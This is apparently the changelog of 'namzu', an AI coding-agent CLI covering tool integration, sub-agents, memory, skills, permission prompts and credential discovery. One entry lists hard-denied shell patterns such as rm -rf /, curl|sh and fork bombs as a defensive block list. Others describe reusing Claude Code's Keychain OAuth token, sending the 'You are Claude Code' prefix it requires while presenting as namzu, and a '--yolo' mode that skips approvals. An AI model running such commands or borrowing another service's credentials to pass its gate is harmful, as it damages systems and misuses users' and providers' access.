  `namzu tools ls` (and `run`, and `sync-types`) now talk to the local clawtool daemon for real. Clawtool is consumed as a runtime dependency: the namzu CLI auto-detects the daemon, spawns it (`clawtool daemon start`) if missing, then proxies its tool catalog into the agent's tool surface via MCP over HTTP. No `@namzu/clawtool` package — adding a tool to clawtool means namzu sees it on next start with zero TS changes.

  **New subcommands** under `namzu tools`:

  - `ls` — list every tool clawtool exposes (auto-spawns the daemon if needed). Output is structured through the M0 formatter; `--format json|yaml` works.
  - `run <name> --input <json>` — invoke a tool by name with JSON arguments and print the structured result. Exit 1 when the tool itself returns an error.
  - `sync-types --output <dir>` — opt-in dev-time codegen. Shells out to `clawtool tools export-typescript` so editor autocomplete + type-checking can bind to clawtool's actual schema; refresh after upgrading clawtool.

  **Internals** (`packages/cli/src/integrations/clawtool/`):

  - `paths.ts` — XDG-aware lookup of `~/.config/clawtool/{daemon.json,listener-token}` (honors `$XDG_CONFIG_HOME`).
  - `state.ts` — parses clawtool's atomic state file with strict shape validation.
  - `auth.ts` — `readToken` (strict) + `tryReadToken` (lenient; returns null for `--no-auth` loopback daemons).
  - `binary.ts` — PATH lookup + `clawtool.binary` config override; actionable error if missing.
  - `daemon.ts` — `ensureDaemon()`: TS port of Go `daemon.Ensure(ctx)` with health-poll + auto-spawn (configurable via `clawtool.autoStart`).
  - `client.ts` — bearer-auth HTTP wrapper (in-tree; minimal).
  - `mcp.ts` — Streamable HTTP MCP client (`initialize` → `notifications/initialized` → `tools/list` / `tools/call`) with `Mcp-Session-Id` round-tripping and SSE single-event response parsing. We did **not** reuse `@namzu/sdk`'s `MCPClient` because its `http-sse` transport targets the older MCP HTTP+SSE spec, whereas clawtool serves the new Streamable HTTP — keeping this in-tree avoids spec drift.
  - `plugin.ts` — `createClawtoolPlugin()`: discovers the catalog and returns proxy `ClawtoolProxyTool` objects with a `call(args)` dispatch.

  **Config schema** extension: `NamzuCliConfig.clawtool?: { binary?, endpoint?, token?, autoStart? }`. All optional; zero-config defaults work out of the box.

  **Tests**: 20 new unit cases (state file parsing, token reading with both strict + lenient variants, PATH lookup with executable detection, MCP client wire shape with mocked fetch including session-id capture / Bearer-omission for no-auth / Mcp-Name routing / error mapping). Total now 76/76 green (was 56). Live end-to-end smoke against a real clawtool 0.22.159 daemon validated `tools ls` (78 tools discovered), `tools run Bash` (real shell roundtrip), and `tools sync-types` (60+ stub files generated).

  **Removed**: the M0 `tools` stub from `commands/stubs.ts`; replaced by the real `commands/tools.ts`.

- 2868c6e: **clawtool tools are now deferred (no token bloat), and namzu identifies as itself.**

  - **Deferred clawtool tools.** Instead of loading clawtool's ~70-tool catalog as active (which re-sent every tool's JSON schema on every agent-loop iteration — a single message could exceed 200k tokens), the catalog is registered as **deferred** tools. Deferred tools cost only a name line in the prompt; the model loads the ones it needs on demand via the built-in `search_tools`. The default active set stays lean (bash/read/write/edit/glob/grep + remember + search_tools), and the connect line shows e.g. `8 tools (+72 on demand)`.
  - **namzu identity.** namzu now presents as namzu — not Claude / Claude Code — even on the Anthropic OAuth path (which requires a "You are Claude Code" prefix for the token to authorize). A namzu identity is injected into the system context so "who are you?" answers "I'm namzu".

- 3d2c354: **clawtool's tools are now built into the TUI agent.**

  When the local clawtool daemon is reachable, namzu folds its MCP tool catalog into the agent's tool registry alongside the SDK builtins — so the model can use clawtool's web/browser/sandbox/git/sub-agent/skill tools (e.g. `clawtool_WebSearch`, `clawtool_BrowserFetch`, `clawtool_SandboxRun`, `clawtool_Commit`, `clawtool_Spawn`) without any extra setup. A warm daemon contributes ~72 tools (its full catalog minus the six that duplicate builtins: Bash/Read/Edit/Glob/Grep/Write).

  Bridged tools are namespaced `clawtool_<Name>`, flagged destructive (so the permission prompt gates them), and execute by forwarding to clawtool's `tools/call`. Loading is best-effort with a hard timeout: if clawtool is absent, down, or slow, namzu silently runs on builtins alone — startup never fails because of it. The connect line now reports the total tool count.

- 9f502d4: **`@file` mentions and Esc-to-interrupt.**

  Type `@path/to/file` in a message and namzu inlines that file's contents for the model while your message keeps the readable `@path` token (files are resolved inside the working directory and size-capped). Press `Esc` to interrupt a running turn — `Ctrl+C` is now reserved for exiting (press twice).

- 2837e6c: **Dark theme, trust-folder gate, bypass-permissions mode, Claude-Code-style tool rendering, and a big token-cost fix.**

  - **Fully dark theme.** The TUI now uses a curated dark hex palette on a black canvas (the root fills with the background and the screen is cleared on launch) for a cohesive, immersed look.
  - **Trust folder gate.** On first launch in a directory, namzu shows the working directory and asks you to trust it before reading/running/editing files there (Claude-Code style). Trusted folders are remembered in `~/.namzu/trust.json`; trusting a repo root covers its subfolders. Declining exits.
  - **Bypass permissions.** `namzu --dangerously-skip-permissions` (alias `--yolo`) runs tools without the approval prompt; a red banner warns while it's active.
  - **Claude-Code-style tool rendering.** Tool calls render as `⏺ Bash(ls -la)` with a dim `⎿ result` line hugging the call, grouped with one blank line between call+result units.
  - **Token-cost fix.** clawtool's ~70-tool catalog no longer inflates the prompt (it could push a single message past 200k tokens). It's registered as deferred tools the model loads on demand via `search_tools` — see the separate changeset.

- 548689f: **Define sub-agents on the fly.** The `Agent` tool now takes an optional `role` — a system prompt describing a specialist persona (e.g. "You are a security auditor; flag vulnerabilities and rate severity"). namzu spins up a fresh sub-agent with that role at runtime, no pre-defined agent file needed; omit `role` for a general-purpose one. Call `Agent` several times in one turn (each with its own `role`) to fan out a parallel swarm of specialists. The persona is layered on top of namzu's anti-fabrication guardrails so a dynamic role can't opt out of "don't invent results".
- 53a1aa4: **Live tool activity, status glyphs, and a context gauge.**

  Tool calls now feel alive: while a tool runs it shows in a live region with an animated spinner and a ticking elapsed timer, and on completion it settles into the transcript with a ✓ (green) / ✗ (red) status glyph and how long it took — e.g. `✓ Bash(npm test) · 1.2s` — above its `⎿` result. Before the first token of a reply the agent shows a `thinking…` line. The status bar gains a context-window fill gauge (`ctx ███░░░░░ 38%`, green→yellow→red as the window fills).

- 8385ac7: **Claude-Code-style header: a bloom icon next to the name / model / cwd.**

  The startup header is now a compact icon + info block (like Claude Code) instead of a large wordmark: a teal→green diamond "bloom" mark (a terminal homage to the namzu.ai SVG) on the left, with `namzu vX.Y.Z`, the connected provider · model, and the working directory stacked to its right. Narrow terminals fall back to a one-line `❀ namzu`.

- 52af97e: **Paste images into the conversation (vision input).**

  A user message can now carry image attachments. `@namzu/sdk` adds an optional `attachments` field to user messages (`ImageAttachment { data, mediaType }`, additive — text messages are unchanged), and the Anthropic provider sends them as image content blocks so the model can see them. In the CLI, press `Ctrl+V` to paste an image from the clipboard — it shows as an `⎘ Image #N` chip in the composer and is sent to the model as vision input when you submit.

- eabdc0d: **Assistant replies now render as markdown.**

  Responses were shown as flat text; they now render the way Claude Code / gemini-cli present them:

  - **Code blocks** in a distinct color on a dim left rule, with the language label.
  - **Inline `code`** in a code color.
  - **Bold** and _italic_ emphasis.
  - Headings (bold, accent for `#`/`##`).
  - Bullet and numbered lists with a marker gutter and hang-indented wrapping; consecutive items stay tight.

  Implemented as a small, dependency-free markdown parser (unit-tested) plus an Ink renderer. Only assistant messages are rendered as markdown — your input and tool/system lines stay verbatim. Syntax highlighting inside code blocks is a follow-up.

- 73dc2b9: **Markdown tables render as aligned grids.**

  Pipe tables (`| A | B |` + `|---|---|` + rows) in assistant replies now render as an aligned grid with a bold header and a dim rule, instead of raw pipe syntax. Column widths auto-fit (capped) to the content.

- b51300c: **namzu now remembers across sessions (memory layer, M4 core).**

  On every turn the TUI loads `~/.namzu/USER.md` (facts about you) and `~/.namzu/MEMORY.md` (durable facts/decisions) and injects them into the agent's system prompt, so namzu carries context across runs — ask it something it learned last session and it knows. Memory is read fresh each turn, so edits take effect immediately, and it's injected only into the system prompt (never echoed into the visible transcript).

  Two new slash commands:

  - `/remember <text>` — append a fact to `MEMORY.md`.
  - `/memory` — show what's currently stored.

  When both files are empty/absent, nothing is injected and behavior is unchanged. Session-search/`/recall` and agent self-curation (memory write tools) are follow-ups.

- c3b4c84: **Queue messages while the agent is working.**

  You can now type and send a message while namzu is still responding — it's held in a queue (a "⏎ N messages queued" hint shows under the composer) and sent automatically as soon as the current turn settles, like Claude Code. The composer stays editable during a turn; queued messages run one at a time in order.

- b1e18c7: **Auto-renew the Claude Code OAuth token so it no longer 401s when it expires.**

  When namzu authenticates with the Claude Code OAuth credential from the macOS Keychain, that access token is short-lived (~8h). Previously namzu read it once at startup and held it for the whole session, so a token that lapsed — typically between turns of a long-lived session — surfaced as `Provider stream error: 401 … Invalid authentication credentials` with no way to recover.

  namzu now refreshes it automatically: before each turn it re-reads the Keychain (picking up a token Claude Code itself may have rotated) and, if the token is at/near expiry, exchanges the refresh token for a fresh one against Anthropic's OAuth endpoint, persisting the result back to the Keychain so it survives future launches. The client is only rebuilt when the token actually changes. Credentials from environment variables or clawtool secrets (which have no refresh path) are never touched.

- e16e4b3: **Paste affordance + a namzu bloom mark on the splash.**

  - Pasting a large or multi-line block no longer floods the input. It's held as an attachment chip — `⎘ Pasted text #1 (+42 lines)` — above the composer, like Claude Code. Type your prompt alongside it and send; the full pasted text is folded into the message. Backspace on an empty line removes the last paste.
  - The startup splash now shows the namzu bloom mark (`❀`, in the icon's signature green) above the NAMZU wordmark.

- 8df8f74: **M2 — Provider profile management** (`ses_003-provider-profiles`)

  `namzu providers` is now a real subcommand surface backed by `~/.namzu/providers.json`. Users persist named LLM provider configurations and the CLI surfaces them safely (secrets masked by default). M3 TUI consumes these profiles to pick a model without inline credentials in every command.

  **New subcommands** under `namzu providers`:

  - `ls [--show-secrets] [--type <t>]` — list configured profiles. Each row shows name, type, model, API key (masked `***1234` unless `--show-secrets`), default flag, and key source (`file` / `env` / `none`).
  - `add <name> --type <type> [--api-key <k>] [--base-url <u>] [--model <m>] [--default]` — persist a new profile. Type-aware: `--organization` / `--project` for openai, `--host` for ollama/lmstudio, `--region` for bedrock, `--base-url` required for http.
  - `remove <name>` — drop a profile (exit 64 if unknown).
  - `default <name>` — flip the `default` flag onto one profile (mutual exclusion enforced).
  - `path` — print the absolute store path (useful for env automation).

  **Storage** (`packages/cli/src/integrations/providers/`):

  - `~/.namzu/providers.json` — versioned (v1) JSON file, mode 0600, parent dir mode 0700. Writes are atomic (temp + rename).
  - Discriminated-union `ProviderProfile` type covers the seven providers `@namzu/sdk` ships (openai, anthropic, openrouter, ollama, bedrock, http, lmstudio).
  - `resolveApiKey(profile, env)` cascade: `NAMZU_<NAME>_API_KEY` → per-type vendor default (`OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `OPENROUTER_API_KEY`) → `profile.apiKey` on disk → `null`. Lets CI / containers inject secrets without touching disk.
  - `maskSecret(s)` returns `***<last4>`; default-safe terminal output.
  - Hand-rolled validator (no Zod yet) — zero-runtime-dep config I/O.

  **Out of scope** for M2 (deferred to M3): live `providers test` (requires LLM call + TUI feedback), OAuth flows (need TUI handoff), interactive `add` prompt for `--api-key` (TTY input → M3).

  **Tests**: 31 new unit cases (schema validation, mask, store round-trip + atomic + 0600 + env cascade + invariants). Total 115/115. Live smoke against a temp HOME validated full CRUD: `add` → `ls --show-secrets` → env override → `remove` → unknown-name 64-exit.

  **Removed**: the M0 `providers` stub from `commands/stubs.ts`; replaced by the real `commands/providers.ts`.

- 03d89f0: **`/resume` — continue a past conversation (SDK-backed sessions).**

  namzu now persists each conversation to the SDK's session store (`DiskSessionStore`) under the working directory's `.namzu` — the same hierarchy `query()` writes its runs to, so a conversation's `session.json` and `runs/` live together. Every turn (your message + the reply) is appended to the active session.

  `/resume` opens a Claude-Code-style picker of this folder's recent conversations (title + relative time); ↑/↓ navigate, Enter restores the transcript and continues in that session, Esc cancels. Each `cwd` is one project (a stable id kept in `.namzu/cli.json`); conversations are sessions under a shared CLI thread. This reuses the SDK's existing persistence rather than a parallel store.

- c8d6b66: **`namzu run` — headless one-shot mode for scripts and CI.**

  `namzu run "your prompt"` runs a single prompt through the same agent the TUI uses and prints the reply to stdout (the equivalent of claude-code's `--print`). The prompt can also come from stdin (`echo "…" | namzu run`), and `--format json` emits `{"text": "…"}`. Status lines go to stderr (silenced by `--quiet`), so stdout is just the answer. It's non-interactive (tools auto-run, but the safety gate still hard-denies catastrophic commands) and uses an ephemeral session, so one-shots don't clutter `/resume`.

- 1587792: **The agent gets the SDK's structured memory (search / read / save).**

  namzu now registers the SDK's memory tools — `save_memory`, `search_memory`, `read_memory` — backed by a `DiskMemoryStore` at `~/.namzu/memory`. The agent can record and recall structured notes on demand across the session, separate from the always-injected user-curated `MEMORY.md`/`USER.md`. (This replaces the earlier ad-hoc `remember` tool; the `/remember` slash command and memory injection are unchanged.)

- 05adb7f: **Skills (M5 core) — load SKILL.md capability docs on demand.**

  namzu now discovers agentskills.io-style skills from `~/.namzu/skills/<name>/SKILL.md` (user) and `<cwd>/skills/<name>/SKILL.md` (project, which shadows user on name clash). Each SKILL.md is YAML frontmatter (`name`, `description`) + a markdown body.

  - `/skills` — list available skills, marking which are active.
  - `/skill <name>` — activate a skill for the session; its body is injected into the agent's system prompt (alongside memory) on subsequent turns, so its guidance shapes the agent's behavior.

  Missing skill dirs are fine (empty list). Verified live: a project skill that says "end every reply with BANANAS" made namzu do exactly that. `namzu skills` CLI subcommands, skill chains, and registry fetch are follow-ups.

- f768cc8: **Slash-command autocomplete in the composer.**

  Typing `/` now opens a dropdown of matching commands (name + description) below the input, the way claude-code and gemini-cli do. Navigate with ↑/↓, press Tab to complete the highlighted command (ready for arguments), or Enter to run it. The dropdown closes once you type a space (moving on to arguments) or anything that isn't a command name; ↑/↓ fall back to input history when it's closed.

- 6b74cd0: **Sub-agents do real work, and tool tracking is keyed on the SDK's tool-use id.**

  - Sub-agents now get the same tool set as the parent — builtins, memory, and clawtool's catalog (deferred, incl. web search/fetch and peer dispatch) — so a delegated research/work task can actually use tools instead of answering from memory alone.
  - The transcript's live tool tracking now matches each call by the SDK's stable `toolUseId` rather than by name/order, so parallel tool calls (even same-named) are attributed correctly.
  - Stronger anti-fabrication instruction for both the main agent and sub-agents: never claim to have run a tool, written a file, or produced a result without actually doing it; if a capability is unavailable, say so instead of inventing output.
  - `@namzu/sdk`: the `Agent` tool's `subagent_type` is now optional when only one sub-agent is registered (defaults to it), so the model can't trip a "subagent_type required" validation error on the common single-sub-agent setup.

- 6473da4: **Sub-agent delegations now show what the sub-agent did.**

  When the agent delegates via the `Agent` tool, the sub-agent's own tool steps are collected while the call runs and shown as a `├─/└─` tree beneath the delegation's result — so you can see the work the sub-agent performed (e.g. which files it read or commands it ran), collapsible with Ctrl+O like any tool output.

- d86b161: **namzu can now delegate to sub-agents.**

  The CLI wires the SDK's native delegation: the model gets the canonical `Agent({ description, prompt, subagent_type })` tool and can hand a self-contained task to a fresh `general-purpose` sub-agent that runs in its own context window with its own tools, then returns its result. Delegations show in the transcript as a normal `Agent(...)` tool call with a live spinner and result.

  To support this from a host, `@namzu/sdk` now exports `ThreadManager` and `InMemoryThreadStore` from its public runtime surface (alongside the already-public `AgentManager`, `AgentRegistry`, `ReactiveAgent`, `LocalTaskGateway`, `buildAgentTool`, and the session/summary/capacity/workspace primitives) so a consumer can stand up an `AgentManager` end to end.

- 31bc8ee: **The agent can track a plan with the SDK task system (todo-style).**

  namzu now passes a `DiskTaskStore` to the agent loop, which auto-registers the SDK's `task_create` / `task_update` / `task_list` tools. The model can lay out and track a multi-step plan for the current request (like Claude Code's todos): new tasks appear as `☐ <subject>` and completed ones as `☑ <subject>` in the transcript. Tasks are scoped to the request.

- 4d56ee4: **Tool calls now show their diff / output, collapsible with Ctrl+O.**

  When namzu edits or writes a file, the change is shown as a `- old` / `+ new` diff (write shows the content) right under the `⏺` call. When it runs a command or reads a file, the output appears under the `⎿` result. Long blocks collapse to 6 lines with a `… +N lines (ctrl+o to expand)` hint; **Ctrl+O** toggles full expansion for everything. Diff lines are colored (green additions, red removals).

- 9b57742: **M3 polish — clawtool-backed onboarding + TUI visual treatment** (`ses_005-credentials-and-tui-polish`)

  `namzu` (no args) now starts the right way: it asks **clawtool** what's available instead of demanding a manual provider profile, and the screen actually looks like a product.

  **Credentials-first onboarding (no login flow, ever).** First run:

  1. Probe `GET /v1/agents` against the local clawtool daemon (auto-spawned via M1's `ensureDaemon`).
  2. Render an inline **picker** listing every agent instance clawtool knows about — `claude`, `codex`, `gemini`, `opencode`, `aider`, `hermes`, etc. — each with a `callable` / `bridge-missing` badge.
  3. User picks a **default** (handles the direct turn) and ticks any others to keep **active** (for subagent dispatch).
  4. Selection persists to `~/.namzu/preferences.json` (mode 0600 — instance names only, **no credentials**; clawtool owns those).
  5. Subsequent turns dispatch via `POST /v1/send_message {instance, prompt}` and stream the NDJSON reply into the transcript.

  Picker keybindings: ↑/↓ navigate, `space` toggle active, `d` set default (must be `callable`), `enter` accept, `esc` cancel. `bridge-missing` rows show with a hint pointing the user at `clawtool agents claim <instance>`.

  **Why this replaces the M3 direct-API path:** clawtool already runs every credential / OAuth / bridge flow on this machine. Detecting env vars + OAuth files in TS would duplicate that and silently diverge. namzu becomes the UX layer over clawtool's authoritative registry. M2's `~/.namzu/providers.json` stays as an escape hatch for raw-API setups but is no longer the front door.

  **TUI visual treatment:**

  - Banner: `▲ namzu <version> · <provider>` on every render — clear identity moment without giant FIGlet.
  - Bordered panels (`borderStyle: 'round'`) around the transcript and composer. Composer border switches to focus color when idle + ready.
  - Message bubbles get role glyphs: `▸ you`, `◆ namzu`, `⚠ system` (not just colored labels — glyphs read faster scanning back).
  - Streaming spinner: braille frames `⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏` in front of the pending assistant bubble while `thinking`. 80ms cadence.
  - StatusBar: `cwd · provider · model │ state │ hint` with `│` dividers and a state glyph (`● idle`, `◐ thinking`, `◑ tool`, `◓ approve?`).
  - Composer prompt glyph: `›` when idle, `…` when disabled.
  - Picker: bordered overlay with `[ ]`/`[x]` toggles + `( )`/`(•)` radio + per-row status badge + dim help footer.

  **Internals** (`packages/cli/src/integrations/clawtool/`):

  - `agents.ts` — `listAgents({callableOnly?})` calls `GET /v1/agents`, returns the typed registry.
  - `dispatch.ts` — `sendMessage({instance, prompt, signal?})` POSTs `/v1/send_message`, streams NDJSON via `response.body.getReader()`, normalizes per-family frames (text deltas, Anthropic `content_block_delta`, OpenAI `choices[0].delta.content`, plain-text passthrough) into a small `{kind: 'delta'|'done'|'error'}` event union. Tool-call / tool-result frames are silently dropped here; surfacing them is ses_006.
  - `preferences.ts` — `~/.namzu/preferences.json` v1 atomic store with `default + active` invariants. Mode 0600 file / 0700 dir, `crypto.randomBytes`-suffixed temp.
  - `daemon.ts` — `ensureDaemon` now honors explicit empty-string token (no-auth daemon) in the fast path; only `undefined` triggers discovery.

  `packages/cli/src/tui/`:

  - `Picker.tsx` — new; the first-run interactive list.
  - `App.tsx` — replaced the M3 Phase-C provider hydration with `probeAgentSession()` (preferences + `/v1/agents`); renders `<Picker>` when first-run, `<Transcript>` + `<Composer>` after.
  - `agent.ts` — replaced direct `provider.chatStream()` with the clawtool dispatch path. The `Message[]` parameter is gone; the TUI just hands `send(text)` a string per turn.
  - `Transcript.tsx`, `StatusBar.tsx`, `Composer.tsx` — visual polish per the section above.

  **Tests**: 20 new unit cases (preferences round-trip + invariants; agents wire shape + Bearer omission for no-auth; dispatch NDJSON parsing across Anthropic / OpenAI / plain-text / error / HTTP-error shapes). Total **150/150** (was 130). React components remain unit-test-free; live smoke against a real clawtool daemon validated the picker → dispatch round-trip.

  **Removed**: direct `@namzu/anthropic` provider construction from the TUI agent session (still a workspace dep, kept available for the M2 escape hatch). The M3 Phase-C "TUI chat against a real provider" surface stays — the path is just different now.

- 88d3a77: **M3 — TUI** (`ses_004-tui`)

  `namzu` (no args) launches an interactive Ink + React TUI. Transcript pane on top, multi-line composer at the bottom, status bar showing cwd · provider · model · state. The TUI is **the product**.

  **Default behavior change:** running `namzu` with no subcommand in a terminal now opens the TUI (replaces the M0 hotfix placeholder). Non-TTY invocations (tests, pipes, CI, `namzu | cat`) still print a one-line marker pointing at `namzu --help` so the binary stays scriptable.

  **Chat works end-to-end.** The session reads the default provider profile from `~/.namzu/providers.json` (M2), constructs an SDK provider via `ProviderRegistry.create()`, and streams the model's response per-delta through `provider.chatStream()`. Conversation history is owned by the TUI and passed on every turn. Empty-session paths (no provider configured, type ≠ anthropic, missing API key, missing model) render an actionable system message — never a crash.

  **Slash commands** (`/help`, `/clear`, `/quit`, `/exit`, `/tools`, `/provider`, `/model`) — registered via a pure parser+registry in `slashCommands.ts` (unit-tested). `/provider` and `/model` show the actual connected profile + model.

  **Keyboard model:**

  - Enter submits, Esc clears the composer, Up/Down browses input history.
  - Ctrl+C twice exits (first press arms + warns; pattern matches claude-code / hermes).
  - `exitOnCtrlC: false` so the TUI owns Ctrl+C semantics rather than Ink killing the process.

  **Provider coverage in this commit:** anthropic only. Other types (openai, openrouter, ollama, bedrock, http, lmstudio) gracefully error with a hint to add an anthropic profile or wait for a follow-up — each is one `register<Vendor>()` + type-case away.

  **Tool dispatch + permission overlay** (Phase D of the original M3 plan) is **deferred to its own session (`ses_005`)** so this milestone closes with a reviewable surface. The user's flagged review checkpoint sits naturally here: chat works, tools are next.

  **Internals** (`packages/cli/src/tui/`):

  - `index.tsx` — `launchTui(ctx)` entry; `exitOnCtrlC: false`; lazy-imported from `cli.ts` so non-TTY paths stay free of Ink.
  - `App.tsx` — root; state-at-top (messages / history / agent-state / session); bootstraps the agent in `useEffect`; `runTurn()` builds the SDK `Message[]` from a transcript snapshot and streams deltas into a pending bubble.
  - `Composer.tsx`, `Transcript.tsx`, `StatusBar.tsx` — Ink components; Composer uses Ink's `useInput` (no extra `ink-text-input` dep).
  - `slashCommands.ts` — pure registry + `parseSlash` / `runSlash`; unit-tested.
  - `agent.ts` — `createAgentSession()` reads the default profile, calls `registerAnthropic()`, constructs the provider, exposes `send(messages, abort?) → AsyncIterable<AgentEvent>` over `provider.chatStream()`.
  - `theme.ts`, `types.ts` — color tokens + shared shapes.

  **Tests**: 14 new cases on `slashCommands` (parseSlash + every command's action). Total 130/130 (was 116). React layer is intentionally not unit-tested in M3 — Ink + JSDOM is brittle; the layer is exercised by live smoke against a real terminal + real anthropic key. `agent.ts` is exercised by the same smoke.

  **Deps added** to `@namzu/cli`: `ink@^7.0.3`, `react@^19.2.6`, `@types/react@^19.2.15`, `@namzu/anthropic` (workspace).

- b4a25fb: **Interactive tool permission + interruptible turns in the TUI.**

  Tools no longer run blind. Before a non-read-only batch (write/edit/bash/append, anything flagged destructive, or any tool not on the read-only allowlist), namzu now shows the proposed call(s) — with a content/diff preview for `write` and `edit` — and waits for **y** (approve) / **n** (reject) / **a** (approve all for this session). Read-only batches (read/glob/grep) still run silently. Rejection feeds the model a decline message so it can adapt; "approve all" stops prompting for the rest of the session.

  This is wired through a custom `resumeHandler` bridged to the TUI via an async `onPermission` callback on `send()`; when no callback is supplied the loop auto-approves (non-interactive behaviour unchanged).

  Ctrl+C is now context-aware: while a turn is running it **interrupts the turn** (aborts the agent loop) instead of arming exit; while awaiting a permission decision it rejects and aborts; only when idle does the existing double-Ctrl+C exit apply.

  Verified end-to-end against the live Anthropic API: asking namzu to write a file triggers a write-permission prompt (destructive, with a content preview); approving runs the write and the file is created.

- 102b68e: **TUI picks an LLM provider, not a clawtool peer.**

  The TUI's first-run picker now selects a primary LLM provider client (Anthropic / OpenAI / OpenRouter / Ollama / LM Studio / Bedrock) — what powers namzu's own chat. Clawtool peers (claude-code / codex / gemini-cli / opencode / aider / hermes) are a separate concern reserved for subagent dispatch and stay wired in the codebase as integration backbones, not as the picker target.

  **Credential discovery (Hermes-style):**

  For each provider in the declarative `PROVIDER_REGISTRY`, scan three sources in order:

  1. **Env vars** with per-provider priority (e.g. `ANTHROPIC_API_KEY` → `ANTHROPIC_TOKEN` → `CLAUDE_CODE_OAUTH_TOKEN`).
  2. **Clawtool's `~/.config/clawtool/secrets.toml`** `[secrets.X]` sections — any `ANTHROPIC_API_KEY`-style key inside a scope counts.
  3. **Local server probes** — Ollama at `localhost:11434/api/tags`, LM Studio at `localhost:1234/v1/models`. Short timeout (500ms), non-throwing.

  The first positive source wins; alternatives are kept so the picker can show them. Discovery never prompts for credentials — what's already on the machine is what's offered.

  **Picker UX:**

  - Bordered round overlay, one row per detected provider with a source-of-truth label (`via ANTHROPIC_API_KEY`, `via clawtool [secrets.work]`, `local · http://localhost:11434/api/tags`).
  - Cursor + numeric 1–9 quick-select. Enter accepts, Esc cancels. The currently-saved provider is marked `← current` (for re-pick).
  - Empty-state path renders an actionable hint listing where to put a credential.

  **Persistence:** `~/.namzu/preferences.json` schema v2 — `{ version: 2, provider, model?, subagents?: { active[] } }`. v1 files (the previous shape that stored a clawtool peer instance) trigger a forced re-pick rather than silent auto-migration; the two primitives are semantically different. File mode 0600, parent dir 0700, atomic temp+rename.

  **Agent runtime:** `agent.ts` goes back to `provider.chatStream()` direct over `@namzu/sdk`'s `ProviderRegistry.create()`. Provider packages (`@namzu/anthropic`, `@namzu/openai`, `@namzu/openrouter`, `@namzu/ollama`) lazy-import on first use so the TUI's cold start doesn't pay for providers the user hasn't picked.

  **Slash:** `/model` now re-opens the picker (was an alias). `/provider` still shows the current selection.

  **Tests:** 16 new (preferences v1/v2 + invariants, discoverer over env / secrets.toml / probes / multi-detect / no-detection / http-never-auto). Total 160/160 (was 144). Code surfaces kept clean of internal session-machinery references per project preference.

  **Internals reshuffled:**

  - New: `packages/cli/src/integrations/providers/{registry,secrets,discover,preferences}.ts`
  - Replaced: `packages/cli/src/tui/{Picker,agent}.tsx/ts` — agents-as-primary path removed.
  - Removed: `packages/cli/src/integrations/clawtool/preferences.{ts,test.ts}` (was the v1 store for peer instances; superseded).
  - Kept: `packages/cli/src/integrations/clawtool/{agents,dispatch}.ts` — these stay shipped as the implementation backbone for subagent dispatch (`SendMessage` fan-out) when that feature lands.

  **Deps added:** `@namzu/openai`, `@namzu/openrouter`, `@namzu/ollama` (workspace), `smol-toml` (~2 KB TOML reader for clawtool's secrets file).

- f03659c: **The TUI can now run tools — namzu actually does work, not just talk.**

  The interactive TUI previously streamed plain text via the provider's single-shot `chatStream()` primitive, so the model could answer but never call a tool. The turn now drives the SDK agent loop (`query()`) with a `ToolRegistry` of the builtin tools (`bash`, `read`, `write`, `edit`, `append`, `glob`, `grep`, `verify_outputs`). The model can read files, run shell commands, and edit code; tool results are fed back and the loop iterates until the turn settles.

  Tool activity is surfaced live in the transcript: a new `tool` line (⚙) shows each call (`bash › echo hi`) and failures are reported inline. The SDK logger is silenced while the TUI is mounted so log lines never corrupt the rendered frame.

  Tools currently run under `permissionMode: 'auto'` (auto-approved); an interactive permission prompt is a follow-up. clawtool's MCP tools are not yet bridged into the registry — the builtin set covers bash/read/edit today.

- 6355e81: **namzu tells you when an update is available — for itself and for clawtool.**

  On launch, namzu does a best-effort check for newer versions of `@namzu/cli` (npm) and clawtool (`clawtool upgrade --check`, with a fallback for older clawtool binaries) and, if either is behind, surfaces a single notice with how to upgrade — e.g. `clawtool 0.22.159 → 0.22.160 (clawtool upgrade)`. Offline / unpublished / no-clawtool is a silent no-op.

- e4f9123: **Safety gate: catastrophic shell commands are hard-denied before they run.**

  namzu now runs every tool call through the SDK's verification gate. Read-only tools auto-run; a narrow set of catastrophic patterns — `rm -rf /`, `mkfs`, `dd if=`, fork bombs, `sudo`/`su -`, `chmod 777 /`, `curl|sh` / `wget|sh`, `ssh user@host`, dynamic `eval` — are **hard-denied** and never execute; everything else still goes to the approval prompt. The deny rule applies even under `--dangerously-skip-permissions` / `--yolo`, so bypass mode can't brick the machine. (The list is narrow: `rm -rf node_modules` and the like are unaffected.)

### Patch Changes

- 229ff8b: **Auto-pick Claude Code's macOS Keychain OAuth token; OAuth-aware Anthropic provider; tighter picker UX.**

  Hotfix landing two coupled pieces — namzu now starts cleanly on a host where claude-code is already signed in, without asking the user to export anything.

  **Credentials side (`@namzu/cli`):**

  - New: macOS Keychain reader. Reads the `Claude Code-credentials` generic-password entry from the login Keychain and extracts the `claudeAiOauth.accessToken` JSON field. Pattern ported from Nous Research's hermes-agent (`agent/anthropic_adapter.py:_read_claude_code_credentials_from_keychain`). Non-throwing — every failure path (non-Darwin, security command missing, entry absent, payload malformed) returns null so the discoverer treats it as "no source" rather than crashing.
  - Discoverer extended: after env vars and clawtool `secrets.toml`, anthropic also accepts the Keychain credential. Detection source is reported as `keychain · Claude Code-credentials` in the picker, so the user can see where their token came from.
  - Token-shape detector: `isAnthropicOAuthToken(value)` identifies OAuth tokens by prefix (`cc-`, `sk-ant-oat`, `eyJ`) vs console API keys (`sk-ant-api`). Drives the apiKey-vs-authToken decision when constructing the Anthropic provider.

  **Provider side (`@namzu/anthropic`):**

  - `AnthropicConfig.apiKey` is now optional, mutually exclusive with the new `authToken` field. Exactly one must be set; the constructor throws if neither is.
  - When `authToken` is supplied, the underlying `@anthropic-ai/sdk` client is constructed with `authToken: <token>` (Bearer auth) and the `anthropic-beta: oauth-2025-04-20` header is injected so Anthropic's OAuth routes accept the request. User-supplied `defaultHeaders` merge on top.
  - API-key path unchanged — existing `apiKey` callers see no behavior change.

  **Picker UX:**

  - Width capped at 72 chars; previously stretched to the full terminal and looked uncomfortable on wide screens.
  - Empty-state copy tightened — concrete `export ANTHROPIC_API_KEY=…` lines instead of a long paragraph; explicit mention that on macOS a signed-in claude-code is auto-detected via the Keychain.
  - Source labels condensed (`env · ANTHROPIC_API_KEY`, `keychain · Claude Code-credentials`, `clawtool · [work]`, `local · localhost:11434/api/tags`).

  **Tests:** 5 new keychain unit cases (token-shape detection) plus existing discover tests updated to opt out of host-ambient sources (`skipKeychain: true`) so the suite stays hermetic on any laptop. Total 165/165 (was 160).

